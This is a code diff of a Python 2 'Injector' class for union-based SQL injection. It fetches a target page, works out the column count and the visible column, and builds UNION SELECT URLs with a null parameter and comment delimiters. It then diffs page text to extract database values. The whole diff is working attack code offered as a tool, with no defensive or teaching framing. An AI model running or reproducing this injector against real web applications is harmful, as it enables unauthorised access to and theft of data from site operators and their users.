@@ -2,7 +2,7 @@
 """ Used for basic union-based SQL injection.
 
 """
-    
+from BeautifulSoup import BeautifulSoup    
 import os, sys, urllib2
 import operator
 import json
@@ -19,26 +19,30 @@ class Injector:
         #self.delimiter = '%20' #Can also be '/**/'
         self.delimiter = '/**/' #Can also be '/**/'
 
-    # Grab page with urllib and split on whitespace.
-    # Throws HTTPError.
-    # Returns list representing page.
     def get_page(self, page):
+        """ Grab page with urllib and split on whitespace.
+            :page: string representing url to be parsed
+            :throws: HTTPError.
+            :returns: list representing page's text
+        """
         if 'http://' not in page:
             page = 'http://' + page
     
         # Try to get HTML, read if successful
         try:
-            message = urllib2.urlopen(page)
+            html = urllib2.urlopen(page).read()
+            message = '\n'.join(BeautifulSoup(html).findAll(text=True))
         except urllib2.HTTPError as e:
             print e
     
-        return message.read().split()
+        return message.split()
     
     # Diff two html lists by turning into sets and taking difference.
     # First param should be before injection, 2nd param after.
     # Returns list representing difference between the two pages.
     def html_diff(self, before_injection, after_injection):
         diff = list(set(after_injection) - set(before_injection))
+
         return diff
     
     # Try unions until no SQL errors returned.
@@ -96,15 +100,14 @@ class Injector:
         columns = self.get_num_columns(page)
         page1 = self.get_page(page)
         data = {}
-        magic_number = self.get_visible_param(page)
+        magic_number = int(self.get_visible_param(page))
     
         union_urls = ['%20' + str(i + self.offset) for i in xrange(1, columns + 1)]
         for param in params:
             data[param] = []
             union_urls[magic_number - 1] = '%20' + param
 
-            new_url = page + '%20UNION%20SELECT' + ','.join(union_urls)
-            #print new_url
+            new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
             data[param] = (self.html_diff(page1, self.get_page(new_url)))
     
         return data
